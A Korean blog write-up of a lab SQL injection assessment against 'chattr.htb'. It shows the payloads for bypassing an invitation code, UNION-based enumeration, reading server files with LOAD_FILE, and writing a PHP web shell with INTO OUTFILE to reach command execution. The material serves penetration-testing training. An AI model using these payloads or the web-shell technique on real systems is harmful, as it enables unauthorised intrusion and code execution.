---
title: "SQL Injection - Skills Assessment"
date: 2026-07-18
layout: single
excerpt: "chattr GmbH는 자사의 웹 애플리케이션을 대상으로 침투 테스트를 수행해 달라고 의뢰하였다. 최근 주요 경쟁사 중 한 곳이 침해 사고를 당한 상황을 고려하여, 특히 SQL Injection 취약점이 발견되고 성공적으로 악용될 경우 회사의 대외 이미지와 수익에 미칠 수 있는 피해를 크게 우려하고 있다. 따라서 웹 애플리케이션을 대상으로 블랙박스 방식의 테스트를 수행하여 SQL Injection 취약점의 존재 여부를 중점적으로 평가해야 한다."
author_profile: true
toc: true
toc_label: "SQL Injection"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-web/sqli-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-web]
tags: [web, cpts, sqli]
---

# Scenario

chattr GmbH는 자사의 웹 애플리케이션을 대상으로 침투 테스트를 수행해 달라고 의뢰하였다.

최근 주요 경쟁사 중 한 곳이 침해 사고를 당한 상황을 고려하여, 특히 SQL Injection 취약점이 발견되고 성공적으로 악용될 경우 회사의 대외 이미지와 수익에 미칠 수 있는 피해를 크게 우려하고 있다.

고객사는 대상 IP 주소만 제공하였으며, 웹사이트에 관한 추가 정보는 제공하지 않았다. 따라서 웹 애플리케이션을 대상으로 블랙박스 방식의 테스트를 수행하여 SQL Injection 취약점의 존재 여부를 중점적으로 평가해야 한다.

## Web Enumeration

대상 웹 애플리케이션에 접속하면 로그인 페이지가 나타난다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql1.png)

상단의 `create account` 메뉴를 선택하면 회원가입 페이지로 이동한다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql2.png)

## Registration Bypass

일반적인 값을 입력하여 회원가입을 시도하면 유효하지 않은 초대 코드라는 의미의 `invalid invitation code` 메시지가 출력된다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql3.png)

회원가입 요청을 확인하기 위해 Burp Suite의 `Proxy` 기능에서 `Intercept` 를 활성화한 뒤 요청을 가로챘다.

가로챈 요청을 확인한 결과, 초대 코드는 `invitationCode` 파라미터를 통해 전달되고 있었다. 해당 파라미터에 다음과 같이 항상 참이 되는 조건을 삽입하였다:

```text
abcd-efgh-1234') or '1'='1'-- -
```

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql4.png)

SQL Injection을 통해 초대 코드 검증 조건을 우회한 결과, 정상적으로 계정이 생성되었다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql5.png)

## Identifying SQL Injection

생성한 계정으로 로그인하면 사용자 목록과 대화 화면이 나타난다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql6.png)

사용자 목록에서 세 번째에 위치한 `@chattr` 계정을 선택하면 검색 입력란과 `@chattr` 가 전송한 메시지를 확인할 수 있다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql7.png)

검색 입력값이 SQL 쿼리에 직접 삽입되는지 확인하기 위해 다음 페이로드를 입력하였다:

```text
test%') and '1'='1'-- -
```

기존 SQL 조건 뒤에 항상 참이 되는 조건을 추가하였으며, SQL Injection이 존재할 경우 정상적인 검색 결과가 유지될 것으로 예상하였다.

실행 결과 기존 메시지가 정상적으로 출력되었으며, 이를 통해 검색 파라미터에 SQL Injection 취약점이 존재함을 확인하였다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql8.png)

## Identifying UNION-Based SQL Injection

UNION 기반 SQL Injection이 가능한지 확인하기 위해 다음 페이로드를 입력하였다:

```text
test%') union select 1,2,3,4-- -
```

실행 결과 `3` 과 `4` 가 페이지에 출력되었다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql9.png)

이를 통해 기존 SQL 쿼리가 총 4개의 컬럼을 반환하며, 세 번째와 네 번째 컬럼의 값이 웹 페이지에 표시된다는 것을 확인하였다.

## Checking FILE Privilege

UNION 기반 SQL Injection을 이용하여 현재 MySQL 사용자에게 파일 읽기 및 쓰기와 관련된 `FILE` 권한이 부여되어 있는지 확인하였다.

사용한 페이로드는 다음과 같다:

```text
test%') union select 1,2,concat(grantee,':',privilege_type),4 from information_schema.user_privileges-- -
```

실행 결과 다음 값이 출력되었다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql10.png)

이를 통해 현재 MySQL 사용자인 `chattr_dbUser@localhost` 에 전역 `FILE` 권한이 부여되어 있음을 확인하였다.

`FILE` 권한이 존재하면 조건에 따라 `LOAD_FILE()` 함수를 이용한 파일 읽기와 `INTO OUTFILE` 을 이용한 파일 쓰기가 가능하다.

다만 `FILE` 권한만으로 항상 파일 작업이 가능한 것은 아니며, `secure_file_priv` 설정과 MySQL 프로세스를 실행하는 운영체제 사용자의 파일 시스템 권한도 함께 충족되어야 한다.

MySQL의 파일 읽기 및 쓰기 경로를 제한하는 `secure_file_priv` 설정을 확인하기 위해 다음 페이로드를 입력하였다:

```text
test%') union select 1,2,concat(variable_name,':',variable_value),4 from information_schema.global_variables where variable_name='secure_file_priv'-- -
```

실행 결과 `SECURE_FILE_PRIV:` 뒤에 별도의 경로가 출력되지 않았다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql11.png)

이는 `secure_file_priv` 값이 빈 문자열로 설정되어 있으며, 해당 설정에 의한 파일 경로 제한이 적용되지 않는다는 의미이다.

## Identifying the Web Root

회원가입 요청에 대한 HTTP 응답을 Burp Suite에서 확인한 결과, 다음과 같은 서버 헤더가 존재하였다:

```http
Server: nginx/1.22.1
```

이를 통해 대상 웹 서버가 Nginx임을 확인하였다.

Ubuntu 및 Debian 계열의 Nginx 기본 사이트 설정은 일반적으로 다음 경로에 위치한다:

```text
/etc/nginx/sites-enabled/default
```

`LOAD_FILE()` 함수를 이용하여 해당 설정 파일을 읽기 위해 다음 페이로드를 입력하였다:

```text
test%') union select 1,2,load_file('/etc/nginx/sites-enabled/default'),4-- -
```

확인된 Nginx 설정은 다음과 같다:

```nginx
server {
    listen 443 ssl;
    server_name chattr.htb;

    ssl_password_file /root/chattr.key.pass;
    ssl_certificate /etc/ssl/certs/chattr.crt;
    ssl_certificate_key /etc/ssl/private/chattr.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    root /var/www/chattr-prod;

    location / {
        index index.php;
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }

    location ^~ /includes/ {
        deny all;
    }
}
```

다음 설정을 통해 대상 웹 애플리케이션의 웹 루트 디렉터리가 `/var/www/chattr-prod` 임을 확인하였다:

```nginx
root /var/www/chattr-prod;
```

## Reading Application Source Code

확인한 웹 루트 디렉터리를 기반으로 애플리케이션의 메인 파일인 `index.php` 를 읽어보았다.

사용한 페이로드는 다음과 같다:

```text
test%') union select 1,2,load_file('/var/www/chattr-prod/index.php'),4-- -
```

실행 결과 서버 내부에 존재하는 `index.php` 파일의 소스 코드가 웹 페이지에 출력되었다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql12.png)

이를 통해 SQL Injection 취약점과 MySQL의 `FILE` 권한을 이용하여 서버 내부의 애플리케이션 소스 코드를 읽을 수 있음을 확인하였다.

## Writing a Web Shell

파일 쓰기가 가능한지 확인하기 위해 `INTO OUTFILE` 구문을 이용하여 웹 루트 디렉터리에 PHP 웹셸을 작성하였다.

사용한 페이로드는 다음과 같다:

```text
test%') union select '','','<?php system($_GET["cmd"]); ?>','' into outfile '/var/www/chattr-prod/shell.php'-- -
```

해당 쿼리는 `/var/www/chattr-prod` 디렉터리에 `shell.php` 파일을 생성하며, `cmd` 파라미터로 전달된 값을 운영체제 명령어로 실행한다.

`INTO OUTFILE`은 기존 파일을 덮어쓸 수 없으므로, 동일한 이름의 파일이 이미 존재하면 새로운 파일 이름을 사용해야 한다.

웹셸 생성 후 다음과 같이 `cmd` 파라미터를 전달하였다:

```text
https://chattr.htb/shell.php?cmd=id
```

실행 결과 다음과 같이 운영체제 명령어의 출력이 반환되었다:

![SQL Injection](/assets/cpts-web/sqli-skills-assessment/sql13.png)

이를 통해 웹셸이 PHP-FPM 서비스 계정인 `www-data` 권한으로 실행되며, SQL Injection 취약점을 이용하여 원격 코드 실행까지 이어질 수 있음을 확인하였다.